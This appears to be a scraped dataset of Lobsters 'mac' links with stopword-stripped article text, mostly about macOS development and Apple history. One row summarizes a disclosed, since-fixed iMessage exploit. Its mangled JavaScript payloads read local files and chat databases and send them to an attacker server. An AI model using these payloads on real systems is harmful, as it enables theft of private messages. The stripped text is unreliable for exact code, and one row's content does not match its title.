577,Lobsters,mac,Apple macOS,Compiling XNU Kernel on OS X 10.10 Yosemite,https://corporatewolfe.wordpress.com/2014/11/08/compiling-xnu-kernel-on-os-x-10-10-yosemite/,compiling xnu kernel o x yosemite,compiling xnu kernel o x yosemite http opensourceapplecomtarballs install succeeded like,compiling xnu kernel o x yosemite source o x yosemite kernel release brings new interesting change already instruction floating around internet compiling think slightly lacking explaining thing try detail much first thing first dependency dependency apart xcode available apple open source site open source package conveniently found http opensourceapplecomtarballs xcode available free mac app store kernel xcode project open xcode ide use backend xcodebuild need accept license start using opened xcode open terminal type sudo xcodebuild licenseand agree ask use command line tool package instead whole xcode package command line tool include full sdk required ctf tool part dtrace package today latest version download extract cd directory terminal make install mkdir obj sym dst xcodebuild install target ctfconvert target ctfdump target ctfmerge arch srcroot pwd objroot pwdobj symroot pwdsym dstroot pwddstyou see install succeeded bottom however installed dst folder created earlier thats dstroot pwddst bit mean finish installing executing sudo ditto dstusrlocal usrlocal availabilityversions latest version ctf tool extract cd directory installation slightly different one instead installing usrlocal installing usrlocal inside macosx sdk inside xcodeapp package mkdir dst make install srcroot pwd dstroot pwddst sudo ditto pwddstusrlocal xcrun sdk macosx showsdkpath usrlocala successful makeinstall give output xnu latest version open terminal execute uname see version release kernel supplied apple download extract cd directory thing get interesting suggest look around source familiarise way work makedefs folder good place start inside find different makefiles makeinctop topmost makefile whole xnu build system flick see defines supported platform apple stripped arm code kernel touched many makefiles true makeinctop includes reference iphoneos iphonesimulator platform obviously platform io io simulator respectively new kernel however iphoneosnano platform ask know however pretty likely apple watch platform sweet anyway back something useful notice new architecture called haswell mac mac haswell variety use instead standard compiling right back terminal compiling pretty simple make targetconfigs release none sdkrootmacosx one makefiles apple changed default sdk macosxinternal name suggests internal sdk apple eye matter xnu compiles fine macosx sdk one included xcodeapp could change reference makefile makedefsmakeinccmd prefer set environment variable build fail set sdkroot targetconfigs three part variable replaces setting archconfigs kernelconfigs respective machine configs upper lowercase make difference converted uppercase one script first part kernel config debug development release second part architecture building haswell use instead note work anymore apple dropped couple release ago mac third part machine config look config file set default none make difference use example could use following build debug kernel haswell mac make targetconfigs debug default sdkrootmacosx building late macbook pretty slow depending machine may want coffee break usually wait minute compiling maverick kernel notice lot error passing silenced release installation compiled head last directory differ sure figure notice kernel called kernel instead old machkernel due location change kernel located systemlibrarykernelskernel instead machkernel install new kernel could almost everyone else seems backup original kernel replace could way apple suggests within sudo cp kernel systemlibrarykernelskernellocal choose suffix really matter long start kernel need tell mac boot using kernel ending local write nvram also add boot argument like point tend add v well watch shiny new kernel boot verbose glory sudo nvram bootargs kcsuffixlocal like double check change following nvram bootargs restart new kernel left verbose boot notice difference check new kernel open terminal execute uname notice date time changed reflect kernel built success go back old kernel remove kcsuffixlocal bootargs reboot enjoy coming back xnu soon intel edison arrives back porting atom architecture happen interested xnu atom general might find fun like like loading
578,Lobsters,mac,Apple macOS,xi editor,https://github.com/google/xi-editor,xi editor,modern editor backend written rust note frontends incredibly high performance beauty reliability developer friendliness learn recurse center localhost talk getting started building core rustup frontends ximac xigtk xiterm xielectron tau http githubcombvincgxi xiwin kod xiqt vixi frontendmd design decision separation frontend backend module native ui rust persistent rope data structure asynchronous operation plugins scripting json current status author author license license contribution contributingmd http xizulipchatcom rxieditor,pronounced zigh modern editor backend written rust note repo contains editor core usable editor based check list frontends xieditor project attempt build high quality text editor using modern software engineering technique initially built macos using cocoa user interface also frontends operating system available thirdparty developer goal include incredibly high performance editing operation commit paint editor never make wait anything beauty editor fit well modern desktop look like throwback text drawing done best technology available core text mac directwrite window etc support unicode fully reliability crashing hanging losing work never happen developer friendliness easy customize xi editor whether adding plugins hacking core learn creator xi raph levien recurse center localhost talk screenshot getting started repository core also need frontend list building core xieditor target recent stable rust recommend installing via rustup current minimum supported version build xieditor core root directory repo cd rust cargo build frontends frontends various stage development ximac official macos frontend xigtk gtk frontend xiterm text ui xielectron crossplatform frontend based webtechnologies tau gtk frontend written rust forked http githubcombvincgxi abandoned xiwin experimental window frontend written rust kod terminal frontend written golang xiqt qt frontend vixi vim like frontend rust following currently inactive based earlier version frontend protocol perhaps could revitalized note call documentation point protocol frontendmd working frontend feel free send pr add list design decision design decision motivation contribute goal separation frontend backend module frontend responsible presenting user interface drawing screen full text backend also known core hold file buffer responsible potentially expensive editing operation native ui crossplatform ui toolkits never look feel quite right best technology building ui native framework platform mac cocoa rust backend need extremely performant particular use little memory buffer edited level performance possible c rust offer much reliable many way higher level programming platform persistent rope data structure persistent rope efficient even large file addition present simple interface client conceptually sequence character like string client need aware internal structure asynchronous operation editor never ever block prevent user getting work done example autosave spawn thread snapshot current editor buffer persistent rope data structure copyonwrite operation nearly free proceed write disk leisure buffer still fully editable plugins scripting text editor associated scripting language extending functionality however language usually arcane le powerful real language xi editor communicate plugins pipe letting written language making easier integrate system version control deeper static analyzer code etc json protocol frontend backend communication well backend plugins based simple json message considered binary format actual improvement performance would completely noise using json considerably lower friction developing plugins available box modern language plenty library available one current status still project early stage mac build basic editing functionality used write readme look spare still missing essential autoindent moment expected main community developer interested hacking text editor author xieditor project started raph levien since received contribution number people see author file detail license project licensed apache license contribution gladly accept contribution via github pull request please see contributingmd detail interested contributing sure start active zulip channel xieditor http xizulipchatcom also xi channel ircmozillaorg finally subreddit rxieditor
579,Lobsters,mac,Apple macOS,Keyboard as Trackpad,https://github.com/Shrugs/asdfghjkl,keyboard trackpad,asdfghjkl youtube inspiration mouse virtualboy nub mouse thing efficient asdfghjkl challenge ran accomplishment proud learned built asdfghjkl next asdfghjkl asdfghjkl info asdfghjkl asdfghjkl,asdfghjkl keyboard trackpad yes really watch action youtube inspiration throughout history invented better better way interfacing machine mouse virtualboy nub mouse thing thinkpads nt satisfied current state input device computer become personal part daily life need better efficient way interacting one biggest inefficiency modern desktop computing moving hand keyboard track pad got rid yup really introducing asdfghjkl revolution computerhuman interface design pattern team keyboard trackpad hold control key run finger across keyboard watch mouse follows command marvel time saved hold shift key run finger across keyboard watch page scroll command marvel time saved challenge ran using computer accomplishment proud using computer learned better use computer built getting mvp working exclusively used asdfghjkl navigation input developing app built swift easy c interoperability partially objc certain function next asdfghjkl apple partnership work nasa partnership going smoothly soon inhabitant i able get done easier thanks mandatory asdfghjkl usage info correct way pronounce asdfghjkl asdfghjkl please nt get wrong additionally way type asdfghjkl sliding finger across entire home row nt hold control mouse fly right
580,Lobsters,mac,Apple macOS,Ron Wayne - Why I Left Apple Computer After Only 12 Days,https://www.facebook.com/RonGWayne/posts/370073493010333,ron wayne left apple computer day,http,writer understand one seems recognize trut h behind trump complete failure provide productive leadership national catastrophe called action office consistently destructive nation government status united state throughout world obvious even casual observer failure leadership simply incompetence ineptitude flatout stupidity something far far worse disastrous behavior regard simply recent example recent proof president intended focus purpose much damage united state people possible dismantle republic structure government click read full article http और
581,Lobsters,mac,Apple macOS,"CloudABI for Mac OS X, part one: Position Independent Executables",https://nuxi.nl/blog/2016/04/21/cloudabi-for-mac-part-1.html,cloudabi mac o x part one position independent executables,cloudabi mac o x part one position independent executables port cloudabi mac o x introduction cloudabi cloudabi capabilitybased security talk gave cloudabi specification cloudabi c library cloudabi port collection integrated freebsd patchset linux kernel mac o x kernel used mac o x open source software lightweight emulator position independent executables pie virtual dynamic shared object vdso thread local storage tl position independent executables relocation entry global offset table got procedure lookup table plt address space layout randomization aslr simply performing couple call position independent executables versus llvm new linker lld fast enable use pie default homebrew package applying relocation startup replacing tire driving riprelative addressing program counter relocator part cloudlibc make section readonly afterwards using much rejoicing closing word info nuxinl edschouten,cloudabi mac o x part one position independent executables april ed schouten given lot interesting thing happening cloudabi development lately thought finally set blog way publish article every often technical others hopefully bit le today starting first threepart series managed port cloudabi mac o x enjoy introduction cloudabi cloudabi allows develop application run without modification variety unixlike operating system make cloudabi unique compared say average program running linux bsd cloudabi make exclusive use capabilitybased security nutshell mean right process purely determined file descriptor posse make possible easily develop application strongly sandboxed attacker manages take execution program heshe able interact small number resource program happened time compromise entire system use capabilitybased security also nice advantage domain testability maintainability sure check talk gave interested complete introduction cloudabi consists couple separate component first cloudabi specification formally describes system call cloudabi program use communicate operating system top cloudabi c library implement many standard cposix programming interface finally cloudabi port collection ported number existing open source library application cloudabi packaged several format arch linux cygwin debian freebsd homebrew allows develop application cloudabi uniform way regardless operating system using run cloudabi executables obviously need use operating system support loading example support already integrated freebsd also developed patchset linux kernel mac o x quite lot engineer use apple hardware daytoday basis think able use cloudabi mac o x make lot sense problem though kernel used mac o x open source software expecting user replace kernel shiny macbooks make little sense developed lightweight emulator map cloudabi executables inside virtual memory mac o x process start executing directly forwarding system call behalf cloudabi application mac o x though emulator provide security guarantee cloudabi normally offer elegant tool developing testing cloudabi software mac o x article going look one specific aspect emulation work technical point view namely emulator requires use position independent executables pie next article talk use virtual dynamic shared object vdso thread local storage tl set work efficiently position independent executables typically need given lot thought writing code language like c c resulting executables often hardcode memory address location program example consider following function convert abbreviated name month number include stringh const char const month jan feb mar apr may jun jul aug sep oct nov dec int lookupmonth const char month int strcmp month month return return small piece code already need hardcode memory address location first lookupmonth function need know address strcmp function start month array placed second month array also need initialized point individual string stored within every memory address compiler need hardcode generates relocation entry written object file header let take look relocation entry look like running readelf command monthso c monthsc r monthso relocation section relatextlookupmonth offset contains entry offset info type sym value sym name addend month strcmp relocation section reladatarelromonths offset contains entry offset info type sym value sym name addend c first two relocation used patch lookupmonths function refer month strcmp global offset table got procedure lookup table plt relocation used initialize month array pointer string note relocation could avoided declaring month twodimensional array containing twelve fourbyte string linker used generate executable consisting one object file come fixed memory layout function variable placed allows linker apply eliminate relocation well almost linking application dynamically relocation referring symbol provided external library libc strcmp retained processed runtime linker ldlinuxso linux process startup brings u answer question position independent executable nothing executable none relocation hardcoding absolute memory address eliminated linker still stored header executable make possible load executable offset memory long relocation applied startup linux bsd ecosystem position independent executables become popular requirement applying full address space layout randomization aslr running cloudabi executables mac o x need make use technique different reason cloudabi executables would need loaded fixed memory address could case memory region used executable would overlap region mac o x decided load emulator pie solves making possible emulator load executable virtually offset simply performing couple mmap call position independent executables versus llvm new linker one thing got u excited earlier year new linker llvm developer working simply called lld fast like clang advantage gnu tool default single installation provides support hardware architecture switched lld package build llvm released though lld worked pretty well u thus far turned support pie still number small bug bug caused linker either generate relocation place generate place managed fix bug meantime commits llvm first release ship linker pie properly time adjusted clang frontend enable use pie default cloudabitoolchain homebrew package mac o x currently installs latest development snapshot llvm course switched llvm released applying relocation startup next piece puzzle getting pie work extend program startup process immediately starting cloudabi executables need apply relocation memory image entire process need implemented way depend code requires relocation course though may sound hard replacing tire driving modern cpu like feature make relatively easy riprelative addressing riprelative addressing global variable function jump target may addressed using absolute memory address using address relative program counter cpu therefore see architecture relocation needed patch global variable constant machine code mean get relocator work quite easily long stay away global variable relocation finished relocator part cloudlibc line code size see cloudlibc relocator capable handling single relocation type relocation type used set pointer address executable loaded offset added addend need handle relocation type one saw previously unlike gnu linker lld seems normalize relocation single type simplifies thing lot downside position independent executables order apply relocation sometimes make certain constant writable apply relocation solve gnu linker lld place constant together one section generate ptgnurelro header providing zrelro command line option use information stored header make section readonly afterwards using mprotect done program properly relocated meaning startup finally continue usual much rejoicing closing word hope enjoyed reading article much enjoyed writing sure send email info nuxinl send message twitter edschouten feedback stay tuned part two
582,Lobsters,mac,Apple macOS,"Min: A smarter, faster web browser",https://palmeral.github.io/min/,min smarter faster web browser,,
583,Lobsters,mac,Apple macOS,"Remote code execution, git, and OS X",https://rachelbythebay.com/w/2016/04/17/unprotected/,remote code execution git o x,remote code execution git o x remote code execution update,remote code execution git o x sometimes think picture show bunch people startup office space might big might small tend mac lot mac lot also use git stuff perhaps via github via place entirely lot oneoff repos place lot people running mac running git great right peace love free software good let say running el capitan git get system installed tonight find mini git version git version apple git anything wrong well yeah actually say hello present everything according report check remote code execution reading suggests point vulnerable version repository controlled attacker could run code machine done game big deal crappy c code get exploited every day upgrade safe next huge hole forever reported meantime people party private stash vulnerability could nt upgrade remember said el capitan apple something new basically keep twiddling certain systemlevel program without going fantastic length even root enough short ca nt replace usrbingit maybe want clever protect user disabling figure something else well sorry also ca nt chmod x least keep used also fail might know thing two apple provides program fact git file usrbin size byte machine might clue might think aha kind abstraction probably right real git know strace see exec oh wait nt linux uh dtruss see exec sudo dtruss git dtrace failed execute git dtrace control executables signed restricted entitlement try string deal actually get output o x machine take gnu string linux box get result none point right direction save trouble digging entire machine tell probably find applicationsxcodeappcontentsdeveloperusrbin chmod x binary git version eventually fail run originally wanted sure wo nt accidentally run figure upgrade strategy course upgrading top almost certainly screw something later time like depend vendor well vendor oh incidentally xcodebuild version xcode build version rely machine like truly sorry feel wrote post attempt goad action affecting lot people important basically screwed apple deigns deliver patched git unto let see happens may post update
584,Lobsters,mac,Apple macOS,Using a different X11 window manager with XQuartz,http://fanf.livejournal.com/142372.html,using different window manager xquartz,particular running remote machine fvwm xquartz quartzwm xquartz x session startup xquartz startup choose window manager supid trick,particular running remote machine rebuilding workstation taking opportunity major housecleaning including moving old home directory stuff cv git since used fvwm window manager weird configuration make work lot like tiling window manager title bar thin window border keypresses move window predefined location main annoyance configuration resolutionindependent massive faff redo different screen layout updating predefined location corresponding keypresses heard good thing thought would try box work lot like fvwm configuration decided make switch probably faff configure way wanted workspace future update much easier xquartz quartzwm configuration home work using xquartz macbook server xquartz come maclike window manager called quartzwm ca nt switch window manager starting another one x allows one window manager time window manager refuse start one already running configure x session want use different window manager x session startup traditionally x stash lot configuration stuff use xdm subdirectory ugly session management script also xinit subdirectory simpler setup debian sensibly move lot gubbins xquartz put well location content session script vary one version another want configure session prepared read shell script debian sensibly unified shared xsession script even man page xquartz startup xquartz use display manager us startx relevant script nice runparts style directory inside script care turn invokes script peruser runparts directory xinitrcd choose window manager mkdir xinitrcd cat binsh exec twm chmod x open applicationsutilitiesxquartzapp sh chmod necessary cause xterm appear twm decoration instead quartzwm decoration supid trick course x network protocol like x application nt run window manager machine x server roughly binsh exec ssh ay workstation xquartz configured run fullscreen good enough serious hack
586,Lobsters,mac,Apple macOS,"If You Can't Break Crypto, Break the Client: Recovery of Plaintext iMessage Data",http://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/,ca nt break crypto break client recovery plaintext imessage data,fixed apple march technical tl dr technical detail message o x reading file taking message database attachment exploit overview github takeaway developer javascript everywhere webkit,fixed apple march applicationlayer bug lead remote disclosure message content attachment plaintext exploiting o x message client contrast attacking imessage protocol relatively simple bug need graduate degree mathematics exploit require advanced knowledge memory management shellcode rop chain attacker requires basic understanding javascript video demonstrates attack action technical tl dr message imessage o x apple implement user interface via embedded version webkit additionally message o x render uri clickable html href uri link attacker create simple javascript uri eg javascript clicked allows attacker code gain initial execution crosssite scripting context application dom though embedded webkit library used message o x executes applewebdata origin attacker still read arbitrary file using xmlhttprequest xhr get request file uri due lack sameorigin policy sop abusing xhr read file attacker upload victim chat history attachment remote server fast victim internet connection allow user interaction required successful attack single click url furthermore victim ability forward text message computer sm forwarding enabled attacker also recover message sent victim iphone want know gritty detail keep reading technical detail message o x message o x depends upon embedded version html rendering engine webkit much user interface message sent received html inserted dom render ui accompanying attachmentsmedia content message sent application rendered dom hence common clientside web vulnerability affect message o x application testing message o x client arbitrary protocol scheme found automatically converted link inserted dom example uris inserted link webview messaged test test smb test testcom file etc anyurihandler anycontentafter message o x implement accepted protocol whitelist attacker send message victim containing javascript namespace javascript converted link victim machine link clicked embedded webkit execute attackercontrolled javascript current origin example note ie n used escape javascript comment required match parser linking pattern code interpreted look like following bishopfoxcomresearch prompt upon clicking link javascript prompt triggered message o x however message o x desktop application website thus javascript executed context applewebdata origin since attacker code executing full webkit implementation xmlhttprequest available runtime one notable difference embedded version webkit web browser like chrome safari webkit implement sameorigin policy sop desktop application attacker take advantage read file local filesystem without violating sameorigin policy sending xmlhttprequest get request file uris requirement attacker must know full file path relative file system path eg sshidrsa used reading file message o x application dom execute following read etcpasswd file function reqlistener prompt thisresponsetext send back attacker server var oreq new xmlhttprequest oreqaddeventlistener load reqlistener oreqopen get file etcpasswd oreqsend converted uri payload code resembles javascript bishopfoxcomresearch thisresponsetext clicked message application following prompt appears vector seems long suspicious shortening uri possible dynamically loading javascript another domain including dom example injects javascript http application dom javascript bishopfoxcomresearch javascript file referenced example contain arbitrary javascript instruction arbitrary length due o x application sandbox file accessible located librarymessages nonuser system directory etc taking message database attachment message attachment received message o x saved directory user lt username gt librarymessages message textual content metadata stored sqlite database located user lt username gt librarymessageschatdb database also contains location attachment located user machine steal database subsequently attachment ever received sent victim advanced attack payload becomes necessary exploit overview following step need carried data successfully removed attacker determine currently loggedin user requesting parsinglibrarypreferencescomappleloginwindowplist file readable o x application sandbox make trivial construct full path user chatdb database file exfiltrated passed custom serverside script extract full path attachment sent received victim found database attachment table full path retrieved malicious javascript payload used extract attachment file victim machine via xmlhttprequest attacker next performs little obfuscation make url appearance realistic javascript wwwfacebookcomphotophp amp amp amp theater victim click uri message o x application victim entire chat history associated attachment transferred attacker exploit code available github takeaway developer javascript everywhere clientside content injection flaw longer limited browser time certainly helpful developer use web technology webkit dangerous kin nwjs build desktop application library adverse effect application security used naively clear embedded web framework allow common vulnerability crosssite scripting x leveraged devastating way previously possible vulnerability also demonstrates power uri machine novice user uri simply link website one variant much complicated ecosystem much like email attachment user never click uri unless trust source came even exercise prudence like thank apple communicating u throughout process cooperation quickly remediating vulnerability
587,Lobsters,mac,Apple macOS,A Brief History of ClarisWorks,http://groups.csail.mit.edu/mac/users/bob/clarisworks.php,brief history clarisworks,iwork http wwwapplecomappleworks http wwwapplecomiwork bestloved application mac brief history clarisworks french prehistory styleware claris part claris part ii oregon whither clarisworks reader feedback appleworks apple ii jeff erickson scott holdaway syd polk apple ii yogen dalal loma prieta earthquake run garage technology venture vp strategic development adobe bob lisbonne lisa opendoc carl grice formed gobe software ceased exist macintouch macfixit gobe gobe productive operating system buying next mit ai lab clarisworks user story mailto rah aimitedu note life time appleworks g pierre omidyar ebay bill campbell firework robert hearn,new introduction iwork includes new number spreadsheet appears clarisworks aka appleworks finally dead official cancellation announcement appleworks longer show list software title online apple store perhaps significantly http wwwapplecomappleworks redirects http wwwapplecomiwork active development appleworks evidently ceased year ago program continued sold rip clarisworks bestloved application mac brief history clarisworks note page written early page also available french thanks stéphane ascoët little tale adventure silicon valley hope find entertaining prehistory styleware claris part claris part ii oregon whither clarisworks reader feedback page history clarisworks called appleworks clarisworks one popular macintosh program time million active user one point nt heard likely find page particularly interesting lot material rapidly becoming ancient history thought better set many recollection could everybody forgets clarisworks completely seems lot confusion surrounding relationship various program named appleworks clarisworks helped fact apple renamed clarisworks appleworks couple year ago fact three completely different program known appleworks history first one textbased program apple ii people also seem confuse claris company clarisworks program fact claris around long clarisworks explained started little software company houston called styleware run kevin harvey styleware made apple ii software multiscribe apple introduced looked interesting new computer apple iigs apple ii acted like mac styleware hired bunch computer science student rice university write software new machine among jeff erickson scott holdaway scott lindsey tom hoke mike hibbetts syd polk natural job apple enthusiast programmer since got first apple ii jeff wrote like macdraw originally called colordraw topdraw first color objectoriented drawing program macstyle graphical user interface mac ii yet arrived mac black white main programming effort styleware became integrated application iigs called gsworks would word processing graphic spreadsheet etc turned difficult undertaking iigs really powerful enough machine support color graphical ui gsworks large complicated program macintosh mhz machine display iigs mhz machine display furthermore time application software iigs written assembly language help tackle project added programmer including notoriously bathrobeclad ian mitchell meanwhile apple formed software subsidiary named claris develop market application software initially claris sold macwrite macpaint macdraw macintosh appleworks apple ii original plan claris would become completely independent apple someday go public never happened naturally claris interested forthcoming appleworkslike program iigs claris bought styleware moved development team office santa clara rechristened gsworks appleworks g already living sf bay area moved fiancé liz harding grad school berkeley late appleworks g ready ship well ready plan point reorganize styleware team around project write integrated application macintosh would compete microsoft work daunting prospect even apparently claris decided daunting finished appleworks g plan changed styleware programmer distributed throughout mac project scott holdaway wound macwrite ii team macdraw ii spite change plan claris many way great place inherited apple culture appealed strong sense creating best cleanest software year later realized feeling led certain blindness pace rest industry moving effort produce slick bugfree software claris neglecting hard reality sheer number feature sell independent elegance design product macwrite pro delayed long stringent quality assurance requirement lost effectiveness market eventually april scott holdaway decided job mind joined claris wanted write new software maintain old software left claris form company spartacus software would create mac integrated application almost everyone claris told u crazy could two programmer compete microsoft one exception yogen dalal vp engineering thought good chance claris gave u equipment return right first refusal wound selling company turned great deal claris spartacus seed capital amounted remember picking computer apple store like yesterday incredibly exciting two u take microsoft knew could bob scott hard work scott made little money styleware sale wife liz job geologist could last first couple month computer mhz macintosh iix set card table dining room scott apartment clarisworks born wanted program eventually sold macworks early version called bsworks bob scott rented house together santa clara save rent spartacus headquarters thing went well first several month settled nice overall architecture program integrated software date effectively several separate program loosely stitched together multiple reason better first something new interesting second two programmer write competitive standalone word processor spreadsheet graphic program database program year third application size big deal day microsoft work big program wanted better came framebased approach functionality particular various application type packaged frame word processing frame graphic frame etc frame used building block make document appropriate type unified programming framework eg word processing document essentially bunch text frame one per page linked together neatly big challenge many subsequent effort building componentbased architecture eg opendoc failed take account toplevel user interface requirement result code shared across document type application also truly integrated frame could embedded eg could plop spreadsheet frame right word processing document text object graphic document fullfeatured word processing engine behind database form editor used builtin graphic environment etc one related cool thing shared graphical context mechanism sometimes stuff would wind displayed multiple frame eg maybe dragging object across page break document multiple page like developed general architecture displaying action live multiple context course lot kind stuff old hat today new exciting creative programming required thing efficiently hardware time cool feature nt make shipping product example originally spreadsheet formula much powerful could relate eg graphical object position document property spreadsheet cell could result calculation move object around graphically viceversa work direction led novel constraintbased programming paradigm called moose may resurrect day work interrupted october loma prieta earthquake magnitude quake interrupted world series lived bay area year several quake nothing prepared one sure house going collapse course nt around november made great progress document type le functional scott done word processing code done graphic overall framework everything else hand lot work left done figured time start shopping program around nt want unemployed forever wanted along take program back claris finish friend styleware gave claris exec demo impressed around claris decided really make sense mac integrated market would buy either u competing effort called smartworks preferred program came time talk number thing nt work claris said give x mind like maybe greedy x nt bad le year work written thought worth lot course claris first right refusal meaning right match offer nothing lose letting u shop elsewhere tried however thing called proper channel nt sent letter steve job next aldus ashtontate others offering program microsoft something would never done without exception nobody returned letter repeated call great program knew way get resource produce market yes bit clueless doubt plenty venture capital opportunity agent available connection get u door big software company remember well silicon valley dotcom culture eventually found tense month however future looked bleak wind changed claris longer sure wanted integrated application nerve frayed somehow managed keep effort going avoid tearing throat one day got call kyle mashima marketing executive claris worked knew u left claris join venture capital firm arranged demo guy kawasaki former apple evangelist former president guy came house gave demo loved said nt guy move office palo alto move wife office across hall seriously way cool everybody knew guy kawasaki read mercury news couple month earlier left acius rampant speculation go next joked get president spartacus distinct possibility however option consider kyle agreed act agent offering program various company next couple month whirlwind demo crunch development indeed move guy office rent free literally moved across hall left porsche poster help keep u motivated time looking buyer scoping possible structure company would actually produce market program guy president kyle vp marketing exciting time complete turnaround recent depth despair living every mac hacker dream would great adventure start company guy kyle end competitive offer started getting made claris sit take notice claris wound offering u everything wanted impossible refuse chance rejoin styleware crew claris stamp quality work guy kyle nt left cold received agent fee guy run garage technology venture kyle vp strategic development adobe always wonder would turned taken course july sold program claris signed letter intent claris friday pink floyd money playing radio drove claris back claris working following monday since left claris moved spiffy new corporate headquarters known wedge suppose get right wedge dilbertland inside still seemed pretty cool hey atrium point thing going great still speedbumps road successful shipping product mentioned claris never went public right claris bought spartacus apple decided keep claris permanent subsidiary line expectation executive staff claris shortly arrived claris president resigned next year executive staff also left general turmoil complicated activity claris joined styleware programmer tom hoke scott lindsey effort finish product codenamed terminator going microsoft work mate gross tester appleworks g headed terminator test team marketing side bob lisbonne joined product manager clarisworks would become product without hard work many talented people claris actual product name yet chosen line macwrite macdraw etc wanted program called macworks name belonged program let lisas emulate mac lisa ancestor macintosh also claris wanted get away mac name producing window version product future possibility firework leading candidate name owned someone fire stationmanagement software unwilling part revolution also option end clarisworks chosen default anything else skip detail next year half long took finish clarisworks sold claris far longer planned due adding feature claris stringent quality assurance simply misestimation amount work required suffice say worked long hard towards end period became critical ship product soon nt one trying shoot microsoft work also smartworks program claris nt buy beagleworks smartworks bought symantec also interested spartacus relabeled greatworks beagleworks another integrated product put beagle bros three due around time take advantage apple newlyintroduced lowercost macintosh model mac classic mac lc mac iisi le expensive existing mac ii line targeted education also big part target market machine shipped configuration megabyte ram achieving acceptable performance model major technical requirement clarisworks finally clarisworks certified golden master october began shipping public initial review positive sale began take liz celebrated trip hawaii thrilled see clarisworks shelf computer store clarisworks quickly surpassed microsoft work sale popularity early microsoft shipped new version microsoft work claim bestselling integrated application macintosh cover box claris legal forced remove inaccurate text microsoft initially objected claris sale number based copy clarisworks bundled mac fact retail sale also better microsoft number revenue microsoft beaten marketplace category dominant time development clarisworks well way clarisworks shipped liz moved portland oregon liz grown nearby time visited family harder leave pacific northwest really wonderful place countless way also wanted get away silicon valley high price crowd course hard believe retrospect house bay area cost many time dream claris would relocate entire development team portland team member amenable illusion claris would see fit open office portland however came time negotiate term contract clarisworks scott put foot portland office contract claris gave end settle vancouver washington across columbia river portland liz bought house whole development crew moved vancouver clarisworks started take shape due course finished clarisworks sale still strong clarisworks winning lot award least according one claris marketing presentation saw clarisworks outselling microsoft office presumably unit revenue couple year clarisworks million product time think time side moving portland began manifest claris management continued turn scott longer close tie latest management team isolating freed lot daily hassle santa clara let u focus programming reality losing contact high price pay development team whole scott personally hard time negotiating contract clarisworks development go particularly smoothly claris needed new version market feature ready shipped version small number feature upgrade scott wish feature set agreed eventually shipped clarisworks time clarisworks shipped claris vision future product different mine continue working one thing required integration opendoc necessitated massive restructuring program opendoc designed tackle lot problem clarisworks tackled project idea metaphor component integration interface architecture two direction particularly compatible left pursue interest scott rest development team stayed clarisworks finished rift claris remaining development team grew wide scott holdaway tom hoke scott lindsey bruce hammond carl grice left claris formed would later become gobe software core engineer one project longest several newer engineer remained three particular responsible opendoc integration apple wwdc demoed version clarisworks opendoc support apple particularly eager demonstrate developer flagship product supporting new component technology ergo everyone else surprisingly anyway following week three engineer recruited microsoft result opendoc support clarisworks maneuver one typical example way microsoft stifle competition ironically case hit product conceived defiance microsoft way january claris corporation ceased exist clarisworks brought directly apple renamed appleworks claris became filemaker inc march apple released appleworks widely perceived minor update several problem eg removal several file translator letter sent macintouch macfixit time meanwhile guy gobe since joined working gobe productive product next logical step beyond clarisworks open architecture written operating system beos interesting backstory gobe founded late speculation widespread apple would buy beos would become basis next mac o thus gobe would leg development new platform however apple surprised everyone buying next instead nextstep became basis mac o x writing wall although u refused read beos survive marketplace thus neither gobe time past year rumor speculation apple working reacquired gobe original clarisworks team produce new mac version appleworks based gobe productive apple gobe indeed discus possibility various point gobe history however liberty go detail apple end acquire gobe three founder scott holdaway scott lindsey carl grice rejoin apple employee gobe failed wo nt tell even record whatever involve gobe productive codebase reasonably sure involve clarisworks appleworks codebase went back grad school study artificial intelligence mit ai lab ironically although dragged team oregon always diehard apple enthusiast bunch one left oregon apple miss depressed lack progress appleworks made past year although still use daily basis wish found way keep moving forward also wish alternative simplicity tight integration spent much effort crafting clarisworks think nothing rather help create modern version clarisworks except finish thesis hoping others carry torch forward since posted page overwhelmed mail thanking clarisworks story clarisworks made people life easier course credit really go many people letter received name removed clarisworks user story comment question mailto rah aimitedu please especially let know remember important part clarisworks history forgotten mention misremembered note unrelated program nextstep later also called topdraw topdraw eventually became beagledraw claris bought styleware everything except gsworks sold company excessively nosy observant might noticed clarisworks file creator id bobo bobo actually related topdraw jeff sat spec topdraw played around lot macdraw one excessively silly creation aided wife liz dog bobo ala bobo lost depth time life every clarisworks file history appleworks g see gareth jones life time appleworks g period new hire joined graphic group pierre omidyar would later go found ebay pierre frequently bounced software design issue think discussion useful later designing clarisworks acius company besides claris created apple effort divest application software idea convince party developer apple competing case relational database program known silver surfer became acius sell day running joke acius refer claris bcius bill campbell inherits used software bill campbell president claris must sold name eventually course firework web graphic program macromedia copyright robert hearn last modified december open lock file hitslck failed
588,Lobsters,mac,Apple macOS,Safari Tech Preview - (Download),https://developer.apple.com/safari/download/,safari tech preview download,safari beta view downloads,safari beta try next version safari macos access latest beta version safari sign apple id view downloads
589,Lobsters,mac,Apple macOS,OSX CryptoTokenKit docs,https://developer.apple.com/library/mac/navigation/index.html#section=Frameworks&topic=CryptoTokenKit,osx cryptotokenkit doc,,copyright apple inc right reserved
590,Lobsters,mac,Apple macOS,"The Deep History of Your Apps: Steve Jobs, NeXTSTEP, and Early Object-Oriented Programming",http://www.computerhistory.org/atchm/the-deep-history-of-your-apps-steve-jobs-nextstep-and-early-object-oriented-programming/,deep history apps steve job nextstep early objectoriented programming,sir tim bernerslee cern used create worldwideweb robert taylor chuck thacker butler lampson bob metcalfe lynn conway charles geschke john warnock chm fellow alan kay chm revolution exhibit source code chm released job revealed actually missed glimpse two parc technology xerox ethernet macintosh revolution making easier end user software developer paid bear develop look time take make gui user interface take time would reduce time developer create application user interface macworld presentation line code developer could write maintain never break user line code developer never write read using metaphor building job brilliantly explained comparative advantage nextstep appkit developer could eliminate code graphical application share common allowing focus code made app unique provided additional value user fireside chat apple may worldwide developer conference nextstep technology provided five ten time speed improvement implementing existing apps create something entirely new could developed platform initially coda collection next software including nextstep openstep enterprise object framework webobjects hhsu computerhistoryorg note reference http,since hundred billion apps downloaded apple app store onto user iphones ipads thousand software developer written apps apple io mobile platform however technology tool powering mobile app revolution new rather long history spanning thirty year one connects back next company steve job started beginning software engineering objectoriented programming late next cube masterpiece expensive next evolved software company cube several next hardware product failed marketplace next greatest innovation nextstep operating environment chm apple io based desktop operating system mac o x importantly io software development kit sdk known cocoa touch based principle foundation mac o x desktop sdk cocoa sdk set tool software library application developer use build apps commonly come form application program interface apis interface call function provided platform builtin 